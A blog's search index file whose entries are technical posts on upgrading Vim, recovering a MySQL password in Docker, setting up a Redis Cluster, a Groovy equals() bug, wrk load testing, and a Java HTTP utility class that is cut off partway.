<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CentOS7中Vim7升级Vim8</title>
    <url>/2021/06/20/CentOS7%E4%B8%ADVim7%E5%8D%87%E7%BA%A7Vim8/</url>
    <content><![CDATA[yum安装#rpm -Uvh http:&#x2F;&#x2F;mirror.ghettoforge.org&#x2F;distributions&#x2F;gf&#x2F;gf-release-latest.gf.el7.noarch.rpm
#rpm --import http:&#x2F;&#x2F;mirror.ghettoforge.org&#x2F;distributions&#x2F;gf&#x2F;RPM-GPG-KEY-gf.el7
wget -P &#x2F;etc&#x2F;yum.repos.d&#x2F;  https:&#x2F;&#x2F;copr.fedorainfracloud.org&#x2F;coprs&#x2F;lbiaggi&#x2F;vim80-ligatures&#x2F;repo&#x2F;epel-7&#x2F;lbiaggi-vim80-ligatures-epel-7.repo
yum -y remove vim-minimal vim-common vim-enhanced sudo
#yum -y --enablerepo&#x3D;gf-plus install vim-enhanced sudo
yum  install vim-enhanced sudo -y

编译安装安装步骤1、首先，到 Vim 官网上下载包 Vim Release 版本在这个步骤的时候，我找了很久的 tar.gz(因为是新人程序猿，对这个不太懂），看网上的教程甚至让把整个项目 clone 下来。最后在终于找到了。点击 “archive” 即可进入。（链接 “https://github.com/vim/vim/releases”）之后选择版本下载即可。
wget https:&#x2F;&#x2F;github.com&#x2F;vim&#x2F;vim&#x2F;archive&#x2F;v8.1.1766.tar.gz

2、解压。
tar -zxvf  v8.1.1766.tar.gz

3、进行安装，通过 configure 配置安装路径  我是直接放在了 &quot;/usr/local&quot; 下面。
cd vim-8.1.1766&#x2F;
.&#x2F;configure --prefix&#x3D;&#x2F;usr&#x2F;local&amp;&amp;make &amp;&amp; make install

4、利用 alias 将 vim 指令定向到刚刚安装的 vim8，同时修改. bashrc 确保之后一直能生效
alias vim&#x3D;&#39;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;vim&#39;
echo &quot;alias vim&#x3D;&#39;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;vim&#39; &quot; &gt;&gt; ~&#x2F;.bashrc

5、最后检查安装是否成功
vim -version
]]></content>
      <tags>
        <tag>vim</tag>
        <tag>centos7</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker中MySQL配置忘记密码启动</title>
    <url>/2021/03/25/Docker%E4%B8%ADMySQL%E9%85%8D%E7%BD%AE%E5%BF%98%E8%AE%B0%E5%AF%86%E7%A0%81%E5%90%AF%E5%8A%A8/</url>
    <content><![CDATA[
docker exec -it mysql容器名 bash
docker exec -it mysql bash
添加 skip-grant-tables 配置
vi &#x2F;etc&#x2F;mysql&#x2F;conf.d&#x2F;docker.cnf

[mysqld]
skip-host-cache
skip-name-resolve
skip-grant-tables
如果提示vi找不到，则执行以下命令
apt-get update &amp;&amp; apt-get install vim -y
执行exit，退出mysql容器

执行systemctl restart docker, 重启docker

docker exec -it mysql容器名 mysql 进入无密码模式的mysql中

操作你需要改动的命令

最后记得执行 flush privileges;，使你刚刚改动的内容生效


]]></content>
      <tags>
        <tag>Docker</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker实战之Redis-Cluster集群</title>
    <url>/2021/06/29/Docker%E5%AE%9E%E6%88%98%E4%B9%8BRedis-Cluster%E9%9B%86%E7%BE%A4/</url>
    <content><![CDATA[
原文地址 https://www.cnblogs.com/idea360/p/12391416.html

概述接上一篇 Docker 实战之 MySQL 主从复制, 这里是 Docker 实战系列的第二篇，主要进行 Redis-Cluster 集群环境的快速搭建。Redis 作为基于键值对的 NoSQL 数据库，具有高性能、丰富的数据结构、持久化、高可用、分布式等特性，同时 Redis 本身非常稳定，已经得到业界的广泛认可和使用。
在 Redis 中，集群的解决方案有三种

 主从复制
 哨兵机制
 Cluster

Redis Cluster 是 Redis 的分布式解决方案，在 3.0 版本正式推出。


集群方案的对比主从复制同 Mysql 主从复制的原因一样，Redis 虽然读取写入的速度都特别快，但是也会产生读压力特别大的情况。为了分担读压力，Redis 支持主从复制，读写分离。一个 Master 可以有多个 Slaves。

优点

  数据备份
  读写分离，提高服务器性能

缺点

  不能自动故障恢复, RedisHA 系统（需要开发）
  无法实现动态扩容

哨兵机制Redis Sentinel 是社区版本推出的原生高可用解决方案，其部署架构主要包括两部分：Redis Sentinel 集群和 Redis 数据集群。
其中 Redis Sentinel 集群是由若干 Sentinel 节点组成的分布式集群，可以实现故障发现、故障自动转移、配置中心和客户端通知。Redis Sentinel 的节点数量要满足 2n+1（n&gt;=1）的奇数个。

优点

  自动化故障恢复

缺点

  Redis 数据节点中 slave 节点作为备份节点不提供服务
  无法实现动态扩容

Redis-ClusterRedis Cluster 是社区版推出的 Redis 分布式集群解决方案，主要解决 Redis 分布式方面的需求，比如，当遇到单机内存，并发和流量等瓶颈的时候，Redis Cluster 能起到很好的负载均衡的目的。
Redis Cluster 着眼于提高并发量。
群集至少需要 3 主 3 从，且每个实例使用不同的配置文件。
在 redis-cluster 架构中，redis-master节点一般用于接收读写，而redis-slave节点则一般只用于备份， 其与对应的 master 拥有相同的 slot 集合，若某个 redis-master 意外失效，则再将其对应的 slave 进行升级为临时 redis-master。
在 redis 的官方文档中，对 redis-cluster 架构上，有这样的说明：在 cluster 架构下，默认的，一般 redis-master 用于接收读写，而 redis-slave 则用于备份，当有请求是在向slave发起时，会直接重定向到对应key所在的master来处理。 但如果不介意读取的是 redis-cluster 中有可能过期的数据并且对写请求不感兴趣时，则亦可通过readonly命令，将 slave 设置成可读，然后通过 slave 获取相关的 key，达到读写分离。具体可以参阅 redis 官方文档等相关内容

优点

  解决分布式负载均衡的问题。具体解决方案是分片 / 虚拟槽 slot。
  可实现动态扩容
  P2P 模式，无中心化

缺点

  为了性能提升，客户端需要缓存路由表信息
  Slave 在集群中充当 “冷备”，不能缓解读压力

网络规划这里没有搭建虚拟机环境，全部在本地部署。本机的 ip 为 192.168.124.5
ipport192.168.124.57001192.168.124.57002192.168.124.57003192.168.124.57004192.168.124.57005192.168.124.57006

Redis 配置文件在 docker 环境中，配置文件映射宿主机的时候，(宿主机) 必须有配置文件。附件在这里。大家可以根据自己的需求定制配置文件。
下边是我的配置文件 redis-cluster.tmpl
# redis端口
port $&#123;PORT&#125;
# 关闭保护模式
protected-mode no
# 开启集群
cluster-enabled yes
# 集群节点配置
cluster-config-file nodes.conf
# 超时
cluster-node-timeout 5000
# 集群节点IP host模式为宿主机IP
cluster-announce-ip 192.168.124.5
# 集群节点端口 7001 - 7006
cluster-announce-port $&#123;PORT&#125;
cluster-announce-bus-port 1$&#123;PORT&#125;
# 开启 appendonly 备份模式
appendonly yes
# 每秒钟备份
appendfsync everysec
# 对aof文件进行压缩时，是否执行同步操作
no-appendfsync-on-rewrite no
# 当目前aof文件大小超过上一次重写时的aof文件大小的100%时会再次进行重写
auto-aof-rewrite-percentage 100
# 重写前AOF文件的大小最小值 默认 64mb
auto-aof-rewrite-min-size 64mb

由于节点 IP 相同，只有端口上的差别，现在通过脚本 redis-cluster-config.sh 批量生成配置文件
for port in &#96;seq 7001 7006&#96;; do \
  mkdir -p .&#x2F;redis-cluster&#x2F;$&#123;port&#125;&#x2F;conf \
  &amp;&amp; PORT&#x3D;$&#123;port&#125; envsubst &lt; .&#x2F;redis-cluster.tmpl &gt; .&#x2F;redis-cluster&#x2F;$&#123;port&#125;&#x2F;conf&#x2F;redis.conf \
  &amp;&amp; mkdir -p .&#x2F;redis-cluster&#x2F;$&#123;port&#125;&#x2F;data; \
done

生成的配置文件如下图

Docker 环境搭建这里还是通过 docker-compose 进行测试环境的 docker 编排。
version: &#39;3.7&#39;

services:
  redis7001:
    image: &#39;redis&#39;
    container_name: redis7001
    command:
      [&quot;redis-server&quot;, &quot;&#x2F;usr&#x2F;local&#x2F;etc&#x2F;redis&#x2F;redis.conf&quot;]
    volumes:
      - .&#x2F;redis-cluster&#x2F;7001&#x2F;conf&#x2F;redis.conf:&#x2F;usr&#x2F;local&#x2F;etc&#x2F;redis&#x2F;redis.conf
      - .&#x2F;redis-cluster&#x2F;7001&#x2F;data:&#x2F;data
    ports:
      - &quot;7001:7001&quot;
      - &quot;17001:17001&quot;
    environment:
      # 设置时区为上海，否则时间会有问题
      - TZ&#x3D;Asia&#x2F;Shanghai


  redis7002:
    image: &#39;redis&#39;
    container_name: redis7002
    command:
      [&quot;redis-server&quot;, &quot;&#x2F;usr&#x2F;local&#x2F;etc&#x2F;redis&#x2F;redis.conf&quot;]
    volumes:
      - .&#x2F;redis-cluster&#x2F;7002&#x2F;conf&#x2F;redis.conf:&#x2F;usr&#x2F;local&#x2F;etc&#x2F;redis&#x2F;redis.conf
      - .&#x2F;redis-cluster&#x2F;7002&#x2F;data:&#x2F;data
    ports:
      - &quot;7002:7002&quot;
      - &quot;17002:17002&quot;
    environment:
      # 设置时区为上海，否则时间会有问题
      - TZ&#x3D;Asia&#x2F;Shanghai


  redis7003:
    image: &#39;redis&#39;
    container_name: redis7003
    command:
      [&quot;redis-server&quot;, &quot;&#x2F;usr&#x2F;local&#x2F;etc&#x2F;redis&#x2F;redis.conf&quot;]
    volumes:
      - .&#x2F;redis-cluster&#x2F;7003&#x2F;conf&#x2F;redis.conf:&#x2F;usr&#x2F;local&#x2F;etc&#x2F;redis&#x2F;redis.conf
      - .&#x2F;redis-cluster&#x2F;7003&#x2F;data:&#x2F;data
    ports:
      - &quot;7003:7003&quot;
      - &quot;17003:17003&quot;
    environment:
      # 设置时区为上海，否则时间会有问题
      - TZ&#x3D;Asia&#x2F;Shanghai


  redis7004:
    image: &#39;redis&#39;
    container_name: redis7004
    command:
      [&quot;redis-server&quot;, &quot;&#x2F;usr&#x2F;local&#x2F;etc&#x2F;redis&#x2F;redis.conf&quot;]
    volumes:
      - .&#x2F;redis-cluster&#x2F;7004&#x2F;conf&#x2F;redis.conf:&#x2F;usr&#x2F;local&#x2F;etc&#x2F;redis&#x2F;redis.conf
      - .&#x2F;redis-cluster&#x2F;7004&#x2F;data:&#x2F;data
    ports:
      - &quot;7004:7004&quot;
      - &quot;17004:17004&quot;
    environment:
      # 设置时区为上海，否则时间会有问题
      - TZ&#x3D;Asia&#x2F;Shanghai


  redis7005:
    image: &#39;redis&#39;
    container_name: redis7005
    command:
      [&quot;redis-server&quot;, &quot;&#x2F;usr&#x2F;local&#x2F;etc&#x2F;redis&#x2F;redis.conf&quot;]
    volumes:
      - .&#x2F;redis-cluster&#x2F;7005&#x2F;conf&#x2F;redis.conf:&#x2F;usr&#x2F;local&#x2F;etc&#x2F;redis&#x2F;redis.conf
      - .&#x2F;redis-cluster&#x2F;7005&#x2F;data:&#x2F;data
    ports:
      - &quot;7005:7005&quot;
      - &quot;17005:17005&quot;
    environment:
      # 设置时区为上海，否则时间会有问题
      - TZ&#x3D;Asia&#x2F;Shanghai


  redis7006:
    image: &#39;redis&#39;
    container_name: redis7006
    command:
      [&quot;redis-server&quot;, &quot;&#x2F;usr&#x2F;local&#x2F;etc&#x2F;redis&#x2F;redis.conf&quot;]
    volumes:
      - .&#x2F;redis-cluster&#x2F;7006&#x2F;conf&#x2F;redis.conf:&#x2F;usr&#x2F;local&#x2F;etc&#x2F;redis&#x2F;redis.conf
      - .&#x2F;redis-cluster&#x2F;7006&#x2F;data:&#x2F;data
    ports:
      - &quot;7006:7006&quot;
      - &quot;17006:17006&quot;
    environment:
      # 设置时区为上海，否则时间会有问题
      - TZ&#x3D;Asia&#x2F;Shanghai

启动结果如图

集群配置redis 集群官方提供了配置脚本，4.x 和 5.x 略有不同，具体可参见集群配置
下边是我自己的环境
docker exec -it redis7001 redis-cli -p 7001 -a 123456 --cluster create 192.168.124.5:7001 192.168.124.5:7002 192.168.124.5:7003 192.168.124.5:7004 192.168.124.5:7005 192.168.124.5:7006 --cluster-replicas 1

看到如下结果说明集群配置成功

集群测试接下来进行一些集群的基本测试
1. 查看集群通信是否正常
redis7001 主节点对它的副本节点 redis7005 进行 ping 操作。

-h host -p port -a pwd

$ docker docker exec -it redis7001 redis-cli -h 192.168.124.5 -p 7005 -a 123456 ping

Warning: Using a password with &#39;-a&#39; or &#39;-u&#39; option on the command line interface may not be safe.
PONG

2. 测试简单存储
redis7001 主节点客户端操作 redis7003 主节点
$ docker docker exec -it redis7001 redis-cli -h 192.168.124.5 -p 7003 -a 123456

Warning: Using a password with &#39;-a&#39; or &#39;-u&#39; option on the command line interface may not be safe.
192.168.124.5:7003&gt; set name admin
(error) MOVED 5798 192.168.124.5:7002

由于 Redis Cluster 会根据 key 进行 hash 运算，然后将 key 分散到不同 slots，name 的 hash 运算结果在 redis7002 节点上的 slots 中。所以我们操作 redis7003 写操作会自动路由到 7002。然而 error 提示无法路由？没关系，差一个 -c 参数而已。
再次运行查看结果如下:
$ docker docker exec -it redis7001 redis-cli -h 192.168.124.5 -p 7003 -a 123456 -c

Warning: Using a password with &#39;-a&#39; or &#39;-u&#39; option on the command line interface may not be safe.
192.168.124.5:7003&gt; set name admin
-&gt; Redirected to slot [5798] located at 192.168.124.5:7002
OK
192.168.124.5:7002&gt; get name
&quot;admin&quot;
192.168.124.5:7002&gt;

3. 查看集群状态

4. 查看 slots 分片

5. 查看集群信息

6. 测试读写分离

试试看，发现读不到，原来在 redis cluster 中，如果你要在 slave 读取数据，那么需要带先执行 readonly 指令，然后 get key
7. 简单压测
选项描述-t指定命令-c客户端连接数-n总请求数-dset、get 的 value 大小 (单位 byte)

测试如下
$ docker docker exec -it redis7001 bash
root@cbc6e76a3ed2:&#x2F;data# redis-benchmark -h 192.168.124.5 -p 7001 -t set -c 100 -n 50000 -d 20
&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; SET &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
  50000 requests completed in 10.65 seconds
  100 parallel clients
  20 bytes payload
  keep alive: 1

0.00% &lt;&#x3D; 2 milliseconds
0.01% &lt;&#x3D; 3 milliseconds
...
100.00% &lt;&#x3D; 48 milliseconds
100.00% &lt;&#x3D; 49 milliseconds
4692.63 requests per second

这里没啥实际意义，在工作业务上大家可以根据 QPS 和主机配置进行压测，计算规划出节点数量。
容灾演练现在我们杀掉主节点 redis7001，看从节点 redis7005 是否会接替它的位置。
$ docker stop redis7001


再试着启动 7001，它将自动作为 slave 挂载到 7005

SpringBoot 配置 Redis 集群在 SpringBoot2.x 版本中，redis 默认的连接池已经更换为 Lettuce，而不再是 jedis。

 在 pom.xml 中引入相关依赖

&lt;dependency&gt;
    &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;
    &lt;artifactId&gt;spring-boot-starter-data-redis&lt;&#x2F;artifactId&gt;
&lt;&#x2F;dependency&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.apache.commons&lt;&#x2F;groupId&gt;
    &lt;artifactId&gt;commons-pool2&lt;&#x2F;artifactId&gt;
&lt;&#x2F;dependency&gt;


 application.yml

spring:
  redis:
    timeout: 6000
    password: 123456
    cluster:
      max-redirects: 3 # 获取失败 最大重定向次数 
      nodes:
        - 192.168.124.5:7001
        - 192.168.124.5:7002
        - 192.168.124.5:7003
        - 192.168.124.5:7004
        - 192.168.124.5:7005
        - 192.168.124.5:7006
    lettuce:
      pool:
        max-active: 1000 #连接池最大连接数（使用负值表示没有限制）
        max-idle: 10 # 连接池中的最大空闲连接
        min-idle: 5 # 连接池中的最小空闲连接
        max-wait: -1 # 连接池最大阻塞等待时间（使用负值表示没有限制）
  cache:
    jcache:
      config: classpath:ehcache.xml


 redis 配置

@Configuration
@AutoConfigureAfter(RedisAutoConfiguration.class)
public class RedisConfig &#123;
    @Bean
    public RedisTemplate&lt;String, Object&gt; redisCacheTemplate(LettuceConnectionFactory redisConnectionFactory) &#123;
        RedisTemplate&lt;String, Object&gt; template &#x3D; new RedisTemplate&lt;&gt;();
        template.setKeySerializer(new StringRedisSerializer());
        template.setValueSerializer(new GenericJackson2JsonRedisSerializer());
        template.setConnectionFactory(redisConnectionFactory);
        return template;
    &#125;
&#125;


 基本测试

@SpringBootTest
public class RedisTest &#123;

    @Autowired
    private RedisTemplate&lt;String, String&gt; redisTemplate;

    @Test
    public void test() &#123;
        redisTemplate.opsForValue().set(&quot;name&quot;, &quot;admin&quot;);
        String name &#x3D; redisTemplate.opsForValue().get(&quot;name&quot;);
        System.out.println(name); &#x2F;&#x2F;输出admin
    &#125;
&#125;

总结通过以上演示，基本上可以在本地环境下用我们的 Redis Cluster 集群了。最后再上一张本地映射文件的最终样子，帮助大家了解 Redis 持久化及集群相关的东西。感兴趣的小伙伴可以自行测试并查看其中的内容。

内容如有错漏，还望大家不吝赐教，同时，欢迎大家关注公众号【当我遇上你】, 你们的支持就是我写作的最大动力。
参考
  https://redis.io/topics/cluster-tutorial

]]></content>
      <tags>
        <tag>Docker</tag>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Git学习区</title>
    <url>/2021/03/13/Git%E5%AD%A6%E4%B9%A0%E5%8C%BA/</url>
    <content><![CDATA[
不做文章，仅用于收藏Git相关的优质文章，方便随时查看

Git基础教程 - 江南一点雨，基础的不能再基础了，想提高的无需阅览Git 概述Git 基本操作Git 中的各种后悔药Git 分支管理Git 关联远程仓库Git 工作区储藏Git 标签管理Git 学习资料
]]></content>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>Groovy: java.lang.StackOverflowError When Implementing equals()</title>
    <url>/2021/07/16/Groovy-java-lang-StackOverflowError-When-Implementing-equals/</url>
    <content><![CDATA[PROBLEMWhile migrating a portion of my Java code to Groovy code, I got bitten by the Groovy operator loading feature that I should have known better… and my pride hurts, but hey, I admit I write shitty code.
Consider this simple POGO with custom equals() and hashCode(), both implemented using Google Guava libraries:-
@Canonical
class Person &#123;
    String firstName
    String lastName
    String email

    @Override
    boolean equals(Object o) &#123;
        if (this &#x3D;&#x3D; o) &#123;
            return true
        &#125;
        if (o &#x3D;&#x3D; null || getClass() !&#x3D; o.getClass()) &#123;
            return false
        &#125;

        final Person other &#x3D; (Person) o

        return Objects.equal(email, other.email)
    &#125;

    @Override
    int hashCode() &#123;
        return Objects.hashCode(email)
    &#125;
&#125;

What is wrong with the above code? Well, if you are mostly a Java developer like me, this look pretty much correct. However, when I perform an equality check, I get java.lang.StackOverflowError exception. I tend to see this exception when I write my too-smart-for-production recursion API that couldn’t seem find its way to end the recursion, causing the JVM stack to blow up.
SOLUTIONThe reason we are getting java.lang.StackOverflowError exception is because Groovy overloads == with equals(). So, if (this == o) { ... } becomes if (this.equals(o)) { ... }. When we perform an equality check, it will call itself again and again until it chokes itself and dies.
To fix this, we have to use if (this.is(o)) { ... } to perform an identity check:-
@Canonical
class Person &#123;
    String firstName
    String lastName
    String email

    @Override
    boolean equals(Object o) &#123;
        if (this.is(o)) &#123;
            return true
        &#125;
        if (o &#x3D;&#x3D; null || getClass() !&#x3D; o.getClass()) &#123;
            return false
        &#125;

        final Person other &#x3D; (Person) o

        return Objects.equal(email, other.email)
    &#125;

    @Override
    int hashCode() &#123;
        return Objects.hashCode(email)
    &#125;
&#125;
]]></content>
      <tags>
        <tag>Grrovy</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP压测工具之wrk</title>
    <url>/2021/03/30/HTTP%E5%8E%8B%E6%B5%8B%E5%B7%A5%E5%85%B7%E4%B9%8Bwrk/</url>
    <content><![CDATA[
wrk 是一款简单的 HTTP 压测工具, 托管在 Github 上,https://github.com/wg/wrk.wrk 的一个很好的特性就是能用很少的线程压出很大的并发量。 原因是它使用了一些操作系统特定的高性能 io 机制, 比如 select, epoll, kqueue 等。 其实它是复用了 redis 的 ae 异步事件驱动框架。 确切的说 ae 事件驱动框架并不是 redis 发明的, 它来至于 Tcl 的解释器 jim, 这个小巧高效的框架, 因为被 redis 采用而更多的被大家所熟知。



安装git clone https:&#x2F;&#x2F;github.com&#x2F;wg&#x2F;wrk.git  
cd wrk  
make

如果编译过程中出错:
src&#x2F;wrk.h:11:25: fatal error: openssl&#x2F;ssl.h: No such file or directory  
 #include &lt;openssl&#x2F;ssl.h&gt;

则需要安装openssl, 使用sudo apt-get install libssl-dev或 sudo yum install openssl-devel安装即可, 最后编辑etc/profile配置环境变量。由于笔者使用的是阿里云 centos7, 相关依赖都已经存在了, 所以可以直接使用。
开始测试一下wrk -t12 -c100 -d30s http:&#x2F;&#x2F;www.baidu.com

这段脚本的输出是:
[root@jerrik &#x2F;]# wrk -t12 -c100 -d30s http:&#x2F;&#x2F;www.baidu.com  
Running 30s test @ http:&#x2F;&#x2F;www.baidu.com
  12 threads and 100 connections
  Thread Stats   Avg      Stdev     Max   +&#x2F;- Stdev
    Latency   211.76ms  304.92ms   1.97s    88.17%
    Req&#x2F;Sec    72.93     68.72   797.00     90.97%
  23725 requests in 30.05s, 347.47MB read
  Socket errors: connect 0, read 48, write 0, timeout 50
Requests&#x2F;sec:    789.57
Transfer&#x2F;sec:     11.56MB
[root@jerrik &#x2F;]#


一般线程数不宜过多。 核数的 2 到 4 倍足够了。 多了反而因为线程切换过多造成效率降低。 因为 wrk 不是使用每个连接一个线程的模型, 而是通过异步网络 io 提升并发量。 所以网络通信不会阻塞线程执行。 这也是 wrk 可以用很少的线程模拟大量网路连接的原因。 而现在很多性能工具并没有采用这种方式, 而是采用提高线程数来实现高并发。 所以并发量一旦设的很高, 测试机自身压力就很大。 测试效果反而下降。

参数解释:

12 threads and 100 connections:  总共是 12 个线程, 100 个连接 (不是一个线程对应一个连接)
latency和Req/Sec:  代表单个线程的统计数据,latency代表延迟时间,Req/Sec代表单个线程每秒完成的请求数，他们都具有平均值, 标准偏差, 最大值, 正负一个标准差占比。一般我们来说我们主要关注平均值和最大值. 标准差如果太大说明样本本身离散程度比较高. 有可能系统性能波动很大.
23725 requests in 30.05s, 347.47MB read  在 30 秒之内总共有 23725 个请求, 总共读取 347.47MB 的数据
Socket errors: connect 0, read 48, write 0, timeout 50  总共有 48 个读错误, 50 个超时。
Requests/sec和Transfer/sec  所有线程平均每秒钟完成了 789.57 个请求, 每秒钟读取 11.56MB 数据量

如果想看看响应时间的分布, 可以增加--latency:
wrk -t12 -c100 -d30s --latency http:&#x2F;&#x2F;www.baidu.com

结果为:
[root@jerrik ~]# wrk -t12 -c100 -d30s --latency http:&#x2F;&#x2F;www.baidu.com 
Running 30s test @ http:&#x2F;&#x2F;www.baidu.com
  12 threads and 100 connections
  Thread Stats   Avg      Stdev     Max   +&#x2F;- Stdev
    Latency   204.30ms  287.90ms   1.97s    88.61%
    Req&#x2F;Sec    71.43     67.59   810.00     89.77%
  Latency Distribution
     50%   14.76ms
     75%  296.79ms
     90%  545.03ms
     99%    1.40s 
  23676 requests in 30.03s, 346.84MB read
  Socket errors: connect 0, read 42, write 0, timeout 46
Requests&#x2F;sec:    788.29
Transfer&#x2F;sec:     11.55MB

说明有 50% 的请求在 14.76ms 之内, 90% 在 545.03ms 之内。
高级用法wrk 可以结合 lua 来做, 通过 wrk 提供的几个 lua 函数来对请求进行修改, 结果输出、设置延迟等操作。下面来看看 wrk 提供的几个 lua 函数:

setup 函数  这个函数在目标 IP 地址已经解析完, 并且所有 thread 已经生成, 但是还没有开始时被调用。 每个线程执行一次这个函数。  可以通过 thread:get(name), thread:set(name, value) 设置线程级别的变量。
init 函数  每次请求发送之前被调用。  可以接受 wrk 命令行的额外参数。 通过 -- 指定。
delay 函数  这个函数返回一个数值, 在这次请求执行完以后延迟多长时间执行下一个请求。 可以对应 thinking time 的场景。
request 函数  通过这个函数可以每次请求之前修改本次请求的属性。 返回一个字符串。 这个函数要慎用, 会影响测试端性能。
response 函数  每次请求返回以后被调用。 可以根据响应内容做特殊处理, 比如遇到特殊响应停止执行测试, 或输出到控制台等等。

function response(status, headers, body)  
   if status ~&#x3D; 200 then  
      print(body)  
      wrk.thread:stop()  
   end  
end


done 函数  在所有请求执行完以后调用, 一般用于自定义统计结果.

done &#x3D; function(summary, latency, requests)  
   io.write(&quot;------------------------------\n&quot;)  
   for _, p in pairs(&#123; 50, 90, 99, 99.999 &#125;) do  
      n &#x3D; latency:percentile(p)  
      io.write(string.format(&quot;%g%%,%d\n&quot;, p, n))  
   end  
end

wrk 官网提供的 setup.lua 实例:
-- example script that demonstrates use of setup() to pass
-- data to and from the threads

local counter &#x3D; 1
local threads &#x3D; &#123;&#125;

function setup(thread)
   thread:set(&quot;id&quot;, counter)
   table.insert(threads, thread)
   counter &#x3D; counter + 1
end

function init(args)
   requests  &#x3D; 0
   responses &#x3D; 0

   local msg &#x3D; &quot;thread %d created&quot;
   print(msg:format(id))
end

function request()
   requests &#x3D; requests + 1
   return wrk.request()
end

function response(status, headers, body)
   responses &#x3D; responses + 1
end

function done(summary, latency, requests)
   for index, thread in ipairs(threads) do
      local id        &#x3D; thread:get(&quot;id&quot;)
      local requests  &#x3D; thread:get(&quot;requests&quot;)
      local responses &#x3D; thread:get(&quot;responses&quot;)
      local msg &#x3D; &quot;thread %d made %d requests and got %d responses&quot;
      print(msg:format(id, requests, responses))
   end
end

使用 setup.lua:
[root@jerrik wrk]# wrk -t 4 -c 100 -d 20s --latency -s scripts&#x2F;setup.lua https:&#x2F;&#x2F;www.baidu.com
thread 1 created
thread 2 created
thread 3 created
thread 4 created
Running 20s test @ https:&#x2F;&#x2F;www.baidu.com
  4 threads and 100 connections
  Thread Stats   Avg      Stdev     Max   +&#x2F;- Stdev
    Latency   251.75ms  336.19ms   2.00s    86.89%
    Req&#x2F;Sec   138.51     69.90   690.00     71.23%
  Latency Distribution
     50%  215.74ms
     75%  401.87ms
     90%  664.84ms
     99%    1.54s 
  11021 requests in 20.02s, 162.82MB read
  Socket errors: connect 0, read 3, write 0, timeout 50
Requests&#x2F;sec:    550.62
Transfer&#x2F;sec:      8.13MB
thread 1 made 2945 requests and got 2919 responses
thread 2 made 2831 requests and got 2807 responses
thread 3 made 2772 requests and got 2747 responses
thread 4 made 2573 requests and got 2548 responses
[root@jerrik wrk]#

将每个线程的请求数和响应数输出来了。其它更多使用可以参考 github script 目录下的 lua 脚本。
总结wrk 作为 http 压测还是非常简便的, 但是要想应对更多复杂场景, 就需要多熟悉 lua 的使用, 深入了解 wrk 提供的那几个函数。其它 http 压测工具, jmeter,apache ab,siege 也可以了解一下。

转载: https://www.jianshu.com/p/ac185e01cc30

]]></content>
      <tags>
        <tag>wrk</tag>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title>HttpUtil-java</title>
    <url>/2021/07/06/HttpUtil-java/</url>
    <content><![CDATA[Http请求工具类


import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

&#x2F;**
 * 简易的 HTTP 请求类
 *&#x2F;
public class HttpUtil &#123;

    private static final Logger log &#x3D; LoggerFactory.getLogger(HttpUtil.class);

    private static final int API_TIMEOUT &#x3D; 180000;

    private static final String POST &#x3D; &quot;POST&quot;;

    private static final String GET &#x3D; &quot;GET&quot;;

    private static String defaultEncoding &#x3D; &quot;utf-8&quot;;

    &#x2F;**
     * http post 请求.请求参数自由组织
     *
     * @param url 地址
     * @param data 请求参数，请求参数可以是 name1&#x3D;value1&amp;name2&#x3D;value2 的形式，也可以是xml、json等其他格式
     * @param charset 字符编码
     * @return
     *&#x2F;
    public static String post(String url, String data, String charset) &#123;
        return httpAccessJDK(url, data, charset, POST);
    &#125;

    &#x2F;**
     * http post 请求
     *
     * @param url 地址
     * @param params 请求参数键值对
     * @param charset 编码
     * @return 以字符串形式返回
     *&#x2F;
    public static String post(String url, Map&lt;String, String&gt; params, String charset) &#123;
        String paramStr &#x3D; getHttpRequestParams(url, params, charset);
        return httpAccessJDK(url, paramStr, charset, POST);
    &#125;

    &#x2F;**
     * http post 请求.默认编码（utf-8)
     *
     * @param url 地址
     * @param params 请求参数键值对
     * @return 以字符串形式返回
     *&#x2F;
    public static String post(String url, Map&lt;String, String&gt; params) &#123;
        String paramStr &#x3D; getHttpRequestParams(url, params, defaultEncoding);
        return httpAccessJDK(url, paramStr, defaultEncoding, POST);
    &#125;

    &#x2F;**
     * http post 请求
     *
     * @param url 地址
     * @param charset 编码
     * @return 以字符串形式返回
     *&#x2F;
    public static String post(String url, String charset) &#123;
        return httpAccessJDK(url, null, charset, POST);
    &#125;

    &#x2F;**
     * http post 请求.默认编码（utf-8)
     *
     * @param url 地址
     * @return 以字符串形式返回
     *&#x2F;
    public static String post(String url) &#123;
        return httpAccessJDK(url, null, defaultEncoding, POST);
    &#125;

    &#x2F;**
     * http get 请求
     *
     * @param url 地址（可带参数）
     * @param params 请求参数键值对
     * @param charset 编码
     * @return 以字符串形式返回
     *&#x2F;
    public static String get(String url, Map&lt;String, String&gt; params, String charset) &#123;
        String paramStr &#x3D; getHttpRequestParams(url, params, charset);
        return httpAccessJDK(url, paramStr, charset, GET);
    &#125;

    &#x2F;**
     * http get 请求.默认编码（utf-8)
     *
     * @param url 地址（可带参数）
     * @param params 请求参数键值对
     * @return 以字符串形式返回
     *&#x2F;
    public static String get(String url, Map&lt;String, String&gt; params) &#123;
        String paramStr &#x3D; getHttpRequestParams(url, params, defaultEncoding);
        return httpAccessJDK(url, paramStr, defaultEncoding, GET);
    &#125;

    &#x2F;**
     * http get 请求
     *
     * @param url 地址
     * @param charset 编码
     * @return 以字符串形式返回
     *&#x2F;
    public static String get(String url, String charset) &#123;
        return httpAccessJDK(url, null, charset, GET);
    &#125;

    &#x2F;**
     * http get 请求.默认编码（utf-8)
     *
     * @param url 地址
     * @return 以字符串形式返回
     *&#x2F;
    public static String get(String url) &#123;
